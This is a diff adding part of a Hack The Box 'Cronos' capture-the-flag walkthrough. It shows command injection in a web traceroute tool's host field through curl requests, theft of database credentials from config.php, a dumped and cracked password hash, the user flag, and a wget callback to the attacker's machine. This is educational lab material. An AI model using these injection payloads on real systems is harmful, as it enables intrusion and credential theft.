@@ -217,3 +217,169 @@ And we get access.
 ![Screenshot_2022-01-22_16-43-18](https://user-images.githubusercontent.com/42389836/150674781-498194a8-4539-497b-82ae-ccc506a00d56.png)
 
 
+By looking at source code, we have chance to run traceroute or ping to some host.
+
+We try code execution: 
+
+![Screenshot_2022-01-22_16-45-08](https://user-images.githubusercontent.com/42389836/150674875-7bd9bf0c-c09a-44f9-875d-2e2a6aaf404f.png)
+
+and we get success:
+
+![Screenshot_2022-01-22_16-45-09](https://user-images.githubusercontent.com/42389836/150674901-5637d5e8-b37f-47ec-b23e-2a27f0089e15.png)
+
+We look at PCAP traffic, so we can take a look on POST request, and grab cookie string:
+
+![capture](https://user-images.githubusercontent.com/42389836/150674998-fcb3ffd1-fd09-4cd9-b99b-3fbf60ed36fc.JPG)
+
+### User flag
+
+From there, we play a bit with cURL:
+
+```
+curl -X POST http://admin.cronos.htb/welcome.php -d "command=traceroute&host=127.0.0.1+%26+ls+/home"
+```
+
+and we discover user noulis.
+
+We can enumerate noulis home directory content:
+
+```
+curl -X POST http://admin.cronos.htb/welcome.php -d "command=traceroute&host=127.0.0.1+%26+ls+-la+/home/noulis/"
+
+
+<html">
+
+   <head>
+      <title>Net Tool v0.1 </title>
+   </head>
+
+   <body>
+        <h1>Net Tool v0.1</h1>
+        <form method="POST" action="">
+        <select name="command">
+                <option value="traceroute">traceroute</option>
+                <option value="ping -c 1">ping</option>
+        </select>
+        <input type="text" name="host" value="8.8.8.8"/>
+        <input type="submit" value="Execute!"/>
+        </form>
+                        total 44<br>
+                drwxr-xr-x 4 noulis noulis 4096 Apr  9  2017 .<br>
+                drwxr-xr-x 3 root   root   4096 Mar 22  2017 ..<br>
+                -rw------- 1 root   root      1 Dec 24  2017 .bash_history<br>
+                -rw-r--r-- 1 noulis noulis  220 Mar 22  2017 .bash_logout<br>
+                -rw-r--r-- 1 noulis noulis 3771 Mar 22  2017 .bashrc<br>
+                drwx------ 2 noulis noulis 4096 Mar 22  2017 .cache<br>
+                drwxr-xr-x 3 root   root   4096 Apr  9  2017 .composer<br>
+                -rw------- 1 root   root    259 Apr  9  2017 .mysql_history<br>
+                -rw-r--r-- 1 noulis noulis  655 Mar 22  2017 .profile<br>
+                -rw-r--r-- 1 root   root     66 Apr  9  2017 .selected_editor<br>
+                -rw-r--r-- 1 noulis noulis    0 Mar 22  2017 .sudo_as_admin_successful<br>
+                -r--r--r-- 1 noulis noulis   33 Mar 22  2017 user.txt<br>
+                      <p><a href = "logout.php">Sign Out</a></p>
+   </body>
+
+</html>
+```
+
+and we can grab flag:
+
+```
+curl -X POST http://admin.cronos.htb/welcome.php -d "command=traceroute&host=127.0.0.1+%26+cat+/home/noulis/user.txt"
+
+   <body>
+        <h1>Net Tool v0.1</h1>
+        <form method="POST" action="">
+        <select name="command">
+                <option value="traceroute">traceroute</option>
+                <option value="ping -c 1">ping</option>
+        </select>
+        <input type="text" name="host" value="8.8.8.8"/>
+        <input type="submit" value="Execute!"/>
+        </form>
+                        51d236438b333970dbba7dc3089be33b<br>
+                      <p><a href = "logout.php">Sign Out</a></p>
+   </body>
+
+</html>
+```
+
+We also grab config.php content, and we get credentials to MySQL database:
+
+```
+..
+define('DB_SERVER', 'localhost');<br>
+                   define('DB_USERNAME', 'admin');<br>
+                   define('DB_PASSWORD', 'kEjdbRigfBHUREiNSDs');<br>
+                   define('DB_DATABASE', 'admin');<br>
+                   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);<br>
+```
+
+We try SSH access with user noulis and that password, but it doesn't work.
+
+Then we try to enumerate databases, and we found "admin" DB:
+
+```
+curl -X POST http://admin.cronos.htb/welcome.php -d "command=traceroute&host=127.0.0.1+%26+mysql+-uadmin+-pkEjdbRigfBHUREiNSDs+-e+%22show+databases%22"
+
+..
+..
+                      Database<br>
+                information_schema<br>
+                admin<br>
+```
+
+With same technique we discover a "users" table, and we obtain another credential:
+
+```
+curl -X POST http://admin.cronos.htb/welcome.php -d "command=traceroute&host=127.0.0.1+%26+mysql+-uadmin+-pkEjdbRigfBHUREiNSDs+admin+-e+%22select+%2A+from+users%3B%22"
+
+..
+..
+
+  id      username        password<br>
+                1       admin   4f5fffa7b2340178a716e3832451e058<br>
+```
+
+We check online and we found original password (1327663704):
+
+https://md5.gromweb.com/?md5=4f5fffa7b2340178a716e3832451e058
+
+This password is still no valid for SSH access with user "noulis", but obviously is working to access login form.
+
+This time we try if we can use wget to download stuff from our attacking machine.
+
+Let's create a simple text file "sugo" and spawn a Python web server:
+
+```
+root@kaligra:/opt/htb/Cronos# cat > sugo
+test
+```
+
+```
+root@kaligra:/opt/htb/Cronos# python3 -m http.server 8888
+Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
+```
+
+We put that string in "traceroute" form:
+
+```
+127.0.0.1 & wget http://10.10.16.2:8888/sugo
+```
+
+and it works:
+
+```
+root@kaligra:/opt/htb/Cronos# python3 -m http.server 8888
+Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
+10.10.10.13 - - [22/Jan/2022 18:08:36] "GET /sugo HTTP/1.1" 200 -
+```
+
+We can confirm that we can put stuff on web server:
+
+![Screenshot_2022-01-22_18-09-12](https://user-images.githubusercontent.com/42389836/150675407-e3f7ec6c-6441-48d0-8e65-6b053eadb222.png)
+
+
+
+
+
